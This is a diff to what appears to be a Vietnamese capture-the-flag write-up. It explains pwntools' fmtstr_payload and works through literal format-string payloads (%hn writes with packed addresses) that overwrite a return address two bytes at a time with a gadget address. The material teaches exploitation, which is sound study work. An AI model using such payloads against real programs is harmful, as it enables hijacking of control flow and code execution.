@@ -121,6 +121,30 @@ for i in range(3):
     p.sendline(payload)
     p.recv()
 ```
+Với:
+```python
+fmtstr_payload(6, {value: position}, write_size='short')
+```
+* `6` là vị trí offset format string trên stack
+* `{value: position}`: value: từng 2 byte, viết tại position: return_addr (+0, +2, +4)
+* `write_size='short'`: short - 2 bytes
+Giả sử:
+```python
+gadget: 0x7f21 dffa 006f
+return_addr = 0x7fffe86afa78
+```
+* {006f: 0x7fffe86afa78}
+  ```
+  %111c%8$hnAAAAAA\x78\xfa\x6a\xe8\xff\x7f\x00\x00
+  ```
+* {dffa: 0x7fffe86afa78 + 2}
+  ```
+  %57338c%8$hnAAAA\x7a\xfa\x6a\xe8\xff\x7f\x00\x00
+  ```
+* {7f21: 0x7fffe86afa78 + 4}
+  ```
+  %32545c%8$hnAAAA\x7c\xfa\x6a\xe8\xff\x7f\x00\x00
+  ```
 
 <img width="802" height="204" alt="image" src="https://github.com/user-attachments/assets/b6284bba-433b-4c90-90c9-8872c15d34c4" />
 <img width="800" height="200" alt="image" src="https://github.com/user-attachments/assets/80df38dd-9022-48c3-afa7-0f2df83a6dd7" />
